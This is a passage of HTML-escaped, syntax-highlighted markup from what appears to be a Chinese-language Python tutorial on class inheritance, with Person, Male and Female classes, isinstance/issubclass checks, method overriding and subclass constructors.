&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建子类&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Male class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Female class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;pass&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#实例化通过子类来实现，子类会继承父类的数据和方法&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;继承判断函数：&lt;&#x2F;p&gt;
&lt;p&gt;isinstance()&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isinstance&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;issubclass&lt;&#x2F;span&gt;&lt;span&gt;()&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isinstance&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong,Female))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;isinstance&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong,Male))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;issubclass&lt;&#x2F;span&gt;&lt;span&gt;(Female,Person))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;方法定制：&lt;&#x2F;p&gt;
&lt;p&gt;类中继承方法的搜索规则：实例—子类—父类&lt;&#x2F;p&gt;
&lt;p&gt;子类除了继承父类的属性，还可以自己添加、定制、拓展更多功能。&lt;&#x2F;p&gt;
&lt;p&gt;若子类的属性和父类的属性名字相同，则以子类属性为主，即子类将父类的方法重写或扩展&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建子类&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Male class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;He is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Female class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;She is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaoming=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaoming&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;10&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#实例化通过子类来实现，子类会继承父类的数据和方法&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;Xiaohong=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;xiaohong&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;9&lt;&#x2F;span&gt;&lt;span&gt;,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaoming.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(Xiaohong.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;())&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;定制构造函数：&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; style=&quot;background-color:#2b303b;color:#c0c5ce;&quot; class=&quot;language-python &quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the person class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    version=&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;1.0  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#数据属性&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;gender&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name=name&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age=age&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender=gender&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printage&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%d&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.age))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;:&lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.name,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender))&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Male&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):  &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#创建子类&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Male class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#给子类设置构造函数&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Person.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,name,age,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;male&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;#子类调用父类的构造函数，并进行修改。在这里直接将父类的gender设置为‘male’&lt;&#x2F;span&gt;&lt;span style=&quot;color:#65737e;&quot;&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#8fa1b3;&quot;&gt;printgender&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;print&lt;&#x2F;span&gt;&lt;span&gt;(&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;He is &lt;&#x2F;span&gt;&lt;span style=&quot;color:#d08770;&quot;&gt;%s&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;%&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;.gender)&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;class &lt;&#x2F;span&gt;&lt;span style=&quot;color:#ebcb8b;&quot;&gt;Female&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;Person&lt;&#x2F;span&gt;&lt;span style=&quot;color:#eff1f5;&quot;&gt;):&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;the Female class&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;&lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;    &lt;&#x2F;span&gt;&lt;span style=&quot;color:#b48ead;&quot;&gt;def &lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;name&lt;&#x2F;span&gt;&lt;span&gt;,&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;age&lt;&#x2F;span&gt;&lt;span&gt;): &lt;&#x2F;span&gt;&lt;span&gt;
&lt;&#x2F;span&gt;&lt;span&gt;        Person.&lt;&#x2F;span&gt;&lt;span style=&quot;color:#96b5b4;&quot;&gt;__init__&lt;&#x2F;span&gt;&lt;span&gt;(&lt;&#x2F;span&gt;&lt;span style=&quot;color:#bf616a;&quot;&gt;self&lt;&#x2F;span&gt;&lt;span&gt;,name,age,&amp;#39;&lt;&#x2F;span&gt;&lt;span style=&quot;color:#a3be8c;&quot;&gt;female&lt;&#x2F;span&gt;&lt;span&gt;&amp;#39;) &lt;&#x2F;span&gt;&lt;span&gt;
